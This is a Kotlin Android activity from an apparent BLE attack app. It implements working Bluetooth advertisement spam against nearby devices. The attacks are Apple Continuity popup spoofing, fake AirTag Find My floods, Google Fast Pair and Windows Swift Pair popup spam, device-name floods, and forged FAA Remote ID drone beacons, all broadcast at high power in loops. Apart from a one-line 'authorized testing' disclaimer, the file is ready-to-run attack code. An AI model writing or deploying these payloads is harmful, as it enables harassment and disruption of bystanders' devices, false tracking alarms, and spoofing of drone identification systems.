package com.ghostech.blehound

import android.app.Activity
import android.app.AlertDialog
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView

class OffensiveToolsActivity : Activity() {

    private var advertiser: BluetoothLeAdvertiser? = null
    private var isAttacking = false
    private val handler = Handler(Looper.getMainLooper())
    private var statusText: TextView? = null
    private var packetsText: TextView? = null
    private var packetCount = 0
    private var currentCallback: AdvertiseCallback? = null
    private var activeAttackName: String? = null

    // Apple Continuity ProximityPair device models (2 bytes each)
    private val appleDeviceModels = listOf(
        byteArrayOf(0x0E, 0x20), // AirPods Pro
        byteArrayOf(0x0A, 0x20), // AirPods Max
        byteArrayOf(0x02, 0x20), // AirPods
        byteArrayOf(0x0F, 0x20), // AirPods 2nd Gen
        byteArrayOf(0x13, 0x20), // AirPods 3rd Gen
        byteArrayOf(0x14, 0x20), // AirPods Pro 2nd Gen
        byteArrayOf(0x10, 0x20), // Beats Flex
        byteArrayOf(0x06, 0x20), // Beats Solo 3
        byteArrayOf(0x03, 0x20), // Powerbeats 3
        byteArrayOf(0x0B, 0x20), // Powerbeats Pro
        byteArrayOf(0x0C, 0x20), // Beats Solo Pro
        byteArrayOf(0x11, 0x20), // Beats Studio Buds
        byteArrayOf(0x05, 0x20), // Beats X
        byteArrayOf(0x09, 0x20), // Beats Studio 3
        byteArrayOf(0x17, 0x20), // Beats Studio Pro
        byteArrayOf(0x12, 0x20), // Beats Fit Pro
        byteArrayOf(0x16, 0x20), // Beats Studio Buds+
    )

    private val spamNames = listOf(
        "\uD83D\uDC1D nyanbee", "\uD83D\uDC1D BUZZ BUZZ", "\uD83C\uDF6F Honey Trap",
        "\uD83D\uDC1D Queen Bee", "\uD83D\uDC1D The Hive", "\uD83D\uDC1D Stinger",
        "\uD83D\uDC1D Hivemind", "\uD83D\uDC1D CK42X.COM",
        "Free WiFi", "AirDrop - iPhone", "Galaxy Buds Pro",
        "FBI Van #3", "Crypto Wallet", "Toilet"
    )

    // Bee-themed spam names (BEE SPAM exclusive)
    // ASCII only, max 20 chars. Emoji break setName on many Android versions.
    private val beeSwarmNames = listOf(
        "[BEE] Worker #1", "[BEE] Worker #2", "[BEE] Worker #3",
        "[BEE] Drone", "[BEE] Scout", "[BEE] Guard",
        "[BEE] Queen Guard", "[BEE] Honey Maker", "[BEE] Pollen Run",
        "[BEE] Wax Builder", "[BEE] Inspector", "[BEE] Royal Jelly",
        "[BEE] Stinger", "[BEE] Nectar Ops", "[BEE] Swarm Lead",
        "[BEE] Larva-01", "[BEE] Comb Cell 7", "[BEE] Waggle",
        "[BEE] Propolis", "[BEE] Forager", "[BEE] Nurse",
        "[BEE] Undertaker", "nyanBEE HQ", "BZZT BZZT",
        "Honeycomb Net", "Sweet Sting", "Apiary Node",
        "CK42X SWARM", "BEE HOUND", "THE HIVE SEES"
    )

    // Samsung/Google Fast Pair model IDs for Sour Droid
    private val samsungFastPairModels = listOf(
        byteArrayOf(0x10, 0xC3.toByte(), 0x01),  // Galaxy Buds
        byteArrayOf(0xEE.toByte(), 0xFB.toByte(), 0x01),  // Galaxy Buds+
        byteArrayOf(0x58, 0xCB.toByte(), 0x01),  // Galaxy Buds Live
        byteArrayOf(0x01, 0xEE.toByte(), 0x01),  // Galaxy Buds Pro
        byteArrayOf(0x53, 0x1F, 0x01),            // Galaxy Buds2
        byteArrayOf(0xAA.toByte(), 0x10, 0x01),   // Galaxy Buds2 Pro
        byteArrayOf(0xD8.toByte(), 0x0E, 0x01),   // Galaxy Buds FE
        byteArrayOf(0x2D, 0x03, 0x01),            // Pixel Buds A-Series
        byteArrayOf(0x72, 0xEF.toByte(), 0x01),   // Pixel Buds Pro
        byteArrayOf(0x0C, 0x0C, 0x01),            // JBL Flip 6
        byteArrayOf(0xF0.toByte(), 0x09, 0x01),   // JBL Live Pro 2
        byteArrayOf(0x06, 0xB6.toByte(), 0x01),   // Sony WF-1000XM4
        byteArrayOf(0x0B, 0xB4.toByte(), 0x01),   // Sony WH-1000XM5
        byteArrayOf(0x82.toByte(), 0x22, 0x01),   // Nothing Ear (1)
        byteArrayOf(0xF5.toByte(), 0x13, 0x01),   // Nothing Ear (2)
    )

    // Flipper Zero spoof names
    private val flipperNames = listOf(
        "Flipper Pwn1", "Flipper Pwn2", "Flipper Pwn3",
        "Flipper Lab-A", "Flipper Lab-B", "Flipper Lab-C",
        "Flipper X-Ray", "Flipper Ghost", "Flipper Recon",
        "Flipper Badger", "Flipper Shark", "Flipper Viper",
        "Flipper Hydra", "Flipper Zero-0", "Flipper Null"
    )

    // Drone Remote ID spoof types
    private val droneTypes = listOf(
        "DJI Mavic 3", "DJI Mini 4 Pro", "DJI Air 3",
        "Parrot Anafi", "Autel EVO Lite", "Skydio 2+",
        "DJI Avata 2", "DJI FPV Combo", "Holy Stone HS720G",
        "Autel EVO Max", "Parrot Disco", "DJI Matrice 350"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btManager = getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        advertiser = btManager.adapter?.bluetoothLeAdvertiser

        val tc = themeColor(this)
        val tcDim = adjustAlpha(tc, 0.3f)
        val tcFaint = adjustAlpha(tc, 0.08f)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF0A0A0A.toInt())
        }

        // ─── HEADER ───
        val header = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(20), dp(18), dp(14))
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(adjustAlpha(tc, 0.12f), 0xFF0A0A0A.toInt())
            ).apply { setStroke(dp(1), tcDim) }
        }

        header.addView(TextView(this).apply {
            text = "OFFENSIVE TOOLS"
            gravity = Gravity.CENTER
            textSize = 18f
            typeface = Typeface.create("sans-serif-black", Typeface.BOLD_ITALIC)
            setTextColor(tc)
            setShadowLayer(12f, 0f, 0f, tcDim)
        })
        header.addView(TextView(this).apply {
            text = "BLE advertisement attacks"
            gravity = Gravity.CENTER
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF666666.toInt())
            setPadding(0, dp(2), 0, 0)
        })
        header.addView(TextView(this).apply {
            text = "CK42X"
            gravity = Gravity.CENTER
            textSize = 8f
            letterSpacing = 0.4f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(adjustAlpha(tc, 0.25f))
            setPadding(0, dp(4), 0, 0)
        })

        // ─── STATUS AREA ───
        val statusContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(10), dp(16), dp(6))
            background = GradientDrawable().apply {
                setColor(0xFF111111.toInt())
                cornerRadius = dp(12).toFloat()
                setStroke(dp(1), 0xFF1A1A1A.toInt())
            }
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(dp(16), dp(8), dp(16), dp(4))
            layoutParams = lp
        }

        statusText = TextView(this).apply {
            text = "IDLE"
            textSize = 13f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF44FF44.toInt())
            gravity = Gravity.CENTER
        }
        packetsText = TextView(this).apply {
            text = "Packets: 0"
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF555555.toInt())
            gravity = Gravity.CENTER
            setPadding(0, dp(2), 0, 0)
        }
        statusContainer.addView(statusText)
        statusContainer.addView(packetsText)

        // ─── SCROLL CONTENT ───
        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(8), dp(16), dp(16))
        }

        // Section: Apple / iOS
        content.addView(buildSectionLabel("APPLE / iOS", tc))
        content.addView(buildAttackButton("SOUR APPLE", "Spoof Continuity popups on nearby iOS devices", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Sour Apple") { startSourApple() }
        }
        content.addView(buildAttackButton("PHANTOM FLOOD", "Flood area with fake AirTag advertisements", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Phantom Flood") { startPhantomFlood() }
        }

        // Section: Android / Google
        content.addView(buildSectionLabel("ANDROID / GOOGLE", tc))
        content.addView(buildAttackButton("SOUR DROID", "Spoof Fast Pair popups on nearby Android devices", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Sour Droid") { startSourDroid() }
        }

        // Section: Windows
        content.addView(buildSectionLabel("WINDOWS", tc))
        content.addView(buildAttackButton("SWIFT PAIR", "Trigger pairing popups on Windows devices", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Swift Pair") { startSwiftPair() }
        }

        // Section: BLE Flood
        content.addView(buildSectionLabel("BLE SPAM", tc))
        content.addView(buildAttackButton("BLE FLOOD", "Flood Bluetooth lists with fake device names", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("BLE Flood") { startBleFlood() }
        }
        content.addView(buildAttackButton("BEE SPAM", "30 bee-themed devices flood every Bluetooth list", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Bee Spam") { startBeeSpam() }
        }
        content.addView(buildAttackButton("FLIPPER SPAM", "Flood Bluetooth lists with spoofed Flipper Zero names", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Flipper Spam") { startFlipperSpam() }
        }

        // Section: RF / Drone
        content.addView(buildSectionLabel("RF / DRONE", tc))
        content.addView(buildAttackButton("DRONE SPOOFER", "Fake drone Remote ID beacons via BLE", tc))
        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
            confirmAndRun("Drone Spoofer") { startDroneSpoofer() }
        }

        scroll.addView(content)

        // ─── BOTTOM BUTTONS ───
        val bottomContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(8), dp(16), dp(16))
        }

        val stopBtn = Button(this).apply {
            text = "STOP ATTACK"
            isAllCaps = true
            textSize = 13f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFFFFF1E0.toInt())
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFFCC0000.toInt(), 0xFF660000.toInt())
            ).apply {
                cornerRadius = dp(14).toFloat()
                setStroke(dp(1), 0xFFFF4444.toInt())
            }
            setPadding(dp(10), dp(14), dp(10), dp(14))
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(0, 0, 0, dp(6))
            layoutParams = lp
        }
        stopBtn.setOnClickListener { stopAttack() }
        bottomContainer.addView(stopBtn)

        val backBtn = buildThemedButton("BACK", tc)
        backBtn.setOnClickListener { finish() }
        bottomContainer.addView(backBtn)

        bottomContainer.addView(TextView(this).apply {
            text = "For authorized security testing only."
            textSize = 9f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF333333.toInt())
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, 0)
        })

        root.addView(header)
        root.addView(statusContainer)
        root.addView(scroll)
        root.addView(bottomContainer)
        setContentView(root)
    }

    private fun confirmAndRun(name: String, action: () -> Unit) {
        if (isAttacking) { stopAttack(); return }
        if (advertiser == null) {
            statusText?.text = "BLE ADVERTISE NOT AVAILABLE"
            statusText?.setTextColor(0xFFFF4444.toInt())
            return
        }
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            return
        }
        AlertDialog.Builder(this)
            .setTitle("Launch $name?")
            .setMessage("This will broadcast BLE advertisements. For authorized testing only.")
            .setNegativeButton("Cancel", null)
            .setPositiveButton("Launch") { _, _ ->
                packetCount = 0
                isAttacking = true
                activeAttackName = name
                // Lock orientation so rotation doesn't kill the attack
                requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LOCKED
                statusText?.text = "$name ACTIVE"
                statusText?.setTextColor(0xFFFF4444.toInt())
                action()
            }
            .show()
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        // Activity handles config changes without restart (via manifest configChanges)
    }

    // Stop current ad, wait, then start new one
    private fun safeAdvertise(data: android.bluetooth.le.AdvertiseData, scanResponse: android.bluetooth.le.AdvertiseData? = null) {
        try {
            currentCallback?.let {
                advertiser?.stopAdvertising(it)
            }
        } catch (_: SecurityException) {}

        currentCallback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                runOnUiThread {
                    packetCount++
                    packetsText?.text = "Packets: $packetCount"
                }
            }
            override fun onStartFailure(errorCode: Int) {
                runOnUiThread {
                    packetsText?.text = "Error code: $errorCode (${errorName(errorCode)})"
                }
            }
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .setTimeout(0)
            .build()

        try {
            if (scanResponse != null) {
                advertiser?.startAdvertising(settings, data, scanResponse, currentCallback)
            } else {
                advertiser?.startAdvertising(settings, data, currentCallback)
            }
        } catch (_: SecurityException) {
            statusText?.text = "PERMISSION DENIED"
            isAttacking = false
        }
    }

    private fun errorName(code: Int) = when(code) {
        1 -> "DATA_TOO_LARGE"
        2 -> "TOO_MANY_ADVERTISERS"
        3 -> "ALREADY_STARTED"
        4 -> "INTERNAL_ERROR"
        5 -> "FEATURE_UNSUPPORTED"
        else -> "UNKNOWN"
    }

    // ─── SOUR APPLE ───
    private fun startSourApple() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val device = appleDeviceModels.random()
                val rand = java.util.Random()

                val payload = ByteArray(27)
                payload[0] = 0x07
                payload[1] = 0x19
                payload[2] = 0x07
                payload[3] = device[0]
                payload[4] = device[1]
                payload[5] = 0x55
                payload[6] = ((rand.nextInt(10) shl 4) or rand.nextInt(10)).toByte()
                payload[7] = ((rand.nextInt(8) shl 4) or rand.nextInt(10)).toByte()
                payload[8] = rand.nextInt(256).toByte()
                payload[9] = 0x00
                payload[10] = 0x00
                for (i in 11 until 27) payload[i] = rand.nextInt(256).toByte()

                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                safeAdvertise(data)

                handler.postDelayed(this, 1500)
            }
        }
        handler.post(runnable)
    }

    // ─── BLE FLOOD ───
    private fun startBleFlood() {
        // Request BLUETOOTH_CONNECT for setName
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            statusText?.text = "NEED BLUETOOTH_CONNECT"
            statusText?.setTextColor(0xFFFF4444.toInt())
            isAttacking = false
            return
        }

        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = spamNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (_: SecurityException) {}

                handler.postDelayed({
                    if (!isAttacking) return@postDelayed

                    try {
                        currentCallback?.let { advertiser?.stopAdvertising(it) }
                    } catch (_: SecurityException) {}

                    val adData = android.bluetooth.le.AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .setIncludeTxPowerLevel(false)
                        .build()

                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
                        .setIncludeDeviceName(true)
                        .setIncludeTxPowerLevel(false)
                        .build()

                    currentCallback = object : AdvertiseCallback() {
                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                            runOnUiThread {
                                packetCount++
                                packetsText?.text = "Packets: $packetCount | $name"
                            }
                        }
                        override fun onStartFailure(errorCode: Int) {
                            runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                        }
                    }

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(true)
                        .setTimeout(0)
                        .build()

                    try {
                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
                    } catch (_: SecurityException) {
                        statusText?.text = "PERMISSION DENIED"
                        isAttacking = false
                    }
                }, 50)

                handler.postDelayed(this, 500)
            }
        }
        handler.post(runnable)
    }

    // ─── SWIFT PAIR ───
    private fun startSwiftPair() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val mfgData = byteArrayOf(
                    0x03, 0x00, 0x80.toByte(), 0x00,
                    (Math.random() * 256).toInt().toByte(),
                    (Math.random() * 256).toInt().toByte()
                )

                val data = BleAdvertiseHelper.buildManufacturerData(0x0006, mfgData)
                safeAdvertise(data)

                handler.postDelayed(this, 300)
            }
        }
        handler.post(runnable)
    }

    // ─── BEE SPAM ───
    private fun startBeeSpam() {
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            statusText?.text = "NEED BLUETOOTH_CONNECT"
            statusText?.setTextColor(0xFFFF4444.toInt())
            isAttacking = false
            return
        }

        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = beeSwarmNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (e: SecurityException) {
                    runOnUiThread {
                        statusText?.text = "BLUETOOTH_CONNECT DENIED"
                        statusText?.setTextColor(0xFFFF4444.toInt())
                    }
                    isAttacking = false
                    return
                }

                handler.postDelayed({
                    if (!isAttacking) return@postDelayed

                    try {
                        currentCallback?.let { advertiser?.stopAdvertising(it) }
                    } catch (_: SecurityException) {}

                    val adData = android.bluetooth.le.AdvertiseData.Builder()
                        .setIncludeDeviceName(true)
                        .setIncludeTxPowerLevel(false)
                        .build()

                    currentCallback = object : AdvertiseCallback() {
                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                            runOnUiThread {
                                packetCount++
                                packetsText?.text = "Bees: $packetCount | $name"
                            }
                        }
                        override fun onStartFailure(errorCode: Int) {
                            runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                        }
                    }

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(true)
                        .setTimeout(0)
                        .build()

                    try {
                        advertiser?.startAdvertising(settings, adData, currentCallback)
                    } catch (_: SecurityException) {
                        statusText?.text = "PERMISSION DENIED"
                        isAttacking = false
                    }
                }, 250)

                handler.postDelayed(this, 1000)
            }
        }
        handler.post(runnable)
    }

    // ─── SOUR DROID ───
    private fun startSourDroid() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val model = samsungFastPairModels.random()
                val rand = java.util.Random()

                val serviceData = ByteArray(6)
                serviceData[0] = 0x00
                serviceData[1] = model[0]
                serviceData[2] = model[1]
                serviceData[3] = model[2]
                serviceData[4] = rand.nextInt(256).toByte()
                serviceData[5] = rand.nextInt(256).toByte()

                val serviceUuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .addServiceData(serviceUuid, serviceData)
                    .build()

                safeAdvertise(data)

                handler.postDelayed(this, 1000)
            }
        }
        handler.post(runnable)
    }

    // ─── FLIPPER SPAM ───
    private fun startFlipperSpam() {
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            statusText?.text = "NEED BLUETOOTH_CONNECT"
            statusText?.setTextColor(0xFFFF4444.toInt())
            isAttacking = false
            return
        }

        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = flipperNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (_: SecurityException) {}

                handler.postDelayed({
                    if (!isAttacking) return@postDelayed

                    try {
                        currentCallback?.let { advertiser?.stopAdvertising(it) }
                    } catch (_: SecurityException) {}

                    val adData = android.bluetooth.le.AdvertiseData.Builder()
                        .setIncludeDeviceName(true)
                        .setIncludeTxPowerLevel(false)
                        .build()

                    currentCallback = object : AdvertiseCallback() {
                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                            runOnUiThread {
                                packetCount++
                                packetsText?.text = "Flippers: $packetCount | $name"
                            }
                        }
                        override fun onStartFailure(errorCode: Int) {
                            runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                        }
                    }

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(true)
                        .setTimeout(0)
                        .build()

                    try {
                        advertiser?.startAdvertising(settings, adData, currentCallback)
                    } catch (_: SecurityException) {
                        statusText?.text = "PERMISSION DENIED"
                        isAttacking = false
                    }
                }, 250)

                handler.postDelayed(this, 1000)
            }
        }
        handler.post(runnable)
    }

    // ─── DRONE SPOOFER ───
    // Uses standard BLE advertising (not promiscuous mode). No root needed.
    // Real FAA Remote ID drones broadcast over BLE 4 Legacy Advertising.
    // ASTM F3411 uses service UUID 0xFFFA. Keep service data under 20 bytes
    // to fit within Android's 31-byte BLE ad limit.
    private fun startDroneSpoofer() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val rand = java.util.Random()
                val droneType = droneTypes.random()

                // Compact Remote ID: msg type + ID type + 10-byte serial
                // Total: 12 bytes service data (fits within BLE ad limits)
                val remoteIdData = ByteArray(12)
                remoteIdData[0] = 0x00  // Message type 0 = Basic ID
                remoteIdData[1] = 0x01  // ID type 1 = Serial Number

                // Short random serial (10 chars ASCII)
                val serial = "SP${rand.nextInt(9999)}${rand.nextInt(9999)}"
                val serialBytes = serial.toByteArray(Charsets.US_ASCII)
                System.arraycopy(serialBytes, 0, remoteIdData, 2, minOf(serialBytes.size, 10))

                val remoteIdUuid = android.os.ParcelUuid.fromString("0000FFFA-0000-1000-8000-00805F9B34FB")

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .addServiceData(remoteIdUuid, remoteIdData)
                    .build()

                safeAdvertise(data)

                runOnUiThread {
                    packetsText?.text = "Drone: $packetCount | $droneType"
                }

                handler.postDelayed(this, 800)
            }
        }
        handler.post(runnable)
    }

    // ─── PHANTOM FLOOD (AirTag Spam) ───
    // Android BLE ad max payload: 31 bytes total (including AD structure overhead)
    // Manufacturer data: 2 bytes company ID + payload bytes + 2 bytes AD header = max ~24 payload bytes
    // Keep payload under 22 bytes to be safe across all Android versions
    private fun startPhantomFlood() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val rand = java.util.Random()

                // Apple Find My "Nearby" advertisement.
                // [0]=type 0x12, [1]=TLV length of bytes after this header,
                // [2]=status 0x10 separated, [3..] random key fragment.
                val payload = ByteArray(25)
                payload[0] = 0x12
                payload[1] = (payload.size - 2).toByte()
                payload[2] = 0x10
                for (i in 3 until payload.size) payload[i] = rand.nextInt(256).toByte()

                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                safeAdvertise(data)

                handler.postDelayed(this, 1500)
            }
        }
        handler.post(runnable)
    }

    private fun stopAttack() {
        isAttacking = false
        activeAttackName = null
        handler.removeCallbacksAndMessages(null)
        try {
            currentCallback?.let { advertiser?.stopAdvertising(it) }
        } catch (_: SecurityException) {}
        currentCallback = null
        statusText?.text = "IDLE"
        statusText?.setTextColor(0xFF44FF44.toInt())
        packetCount = 0
        packetsText?.text = "Packets: 0"
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED
    }

    override fun onDestroy() {
        stopAttack()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            statusText?.text = "PERMISSION GRANTED. TAP AGAIN."
            statusText?.setTextColor(0xFF44FF44.toInt())
        }
    }

    // ─── UI BUILDERS ───

    private fun buildSectionLabel(label: String, tc: Int): TextView {
        return TextView(this).apply {
            text = label
            textSize = 9f
            letterSpacing = 0.3f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(adjustAlpha(tc, 0.5f))
            setPadding(dp(4), dp(14), 0, dp(4))
        }
    }

    private fun buildAttackButton(label: String, desc: String, tc: Int): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF181818.toInt(), 0xFF101010.toInt())
            ).apply {
                cornerRadius = dp(12).toFloat()
                setStroke(dp(1), adjustAlpha(tc, 0.15f))
            }
            setPadding(dp(14), dp(12), dp(14), dp(12))
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(0, 0, 0, dp(6))
            layoutParams = lp
            isClickable = true
            isFocusable = true
        }
        container.addView(TextView(this).apply {
            text = label
            textSize = 13f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFFF0E6D6.toInt())
        })
        container.addView(TextView(this).apply {
            text = desc
            textSize = 9f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF666666.toInt())
            setPadding(0, dp(2), 0, 0)
        })
        return container
    }

    private fun buildThemedButton(label: String, tc: Int) = Button(this).apply {
        text = label
        isAllCaps = true
        textSize = 12f
        typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
        setTextColor(0xFFF0E6D6.toInt())
        background = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(0xFF1A1A1A.toInt(), 0xFF111111.toInt())
        ).apply {
            cornerRadius = dp(14).toFloat()
            setStroke(dp(1), adjustAlpha(tc, 0.2f))
        }
        setPadding(dp(10), dp(12), dp(10), dp(12))
    }

    private fun adjustAlpha(color: Int, factor: Float): Int {
        val alpha = (255 * factor).toInt()
        return (alpha shl 24) or (color and 0x00FFFFFF)
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
}
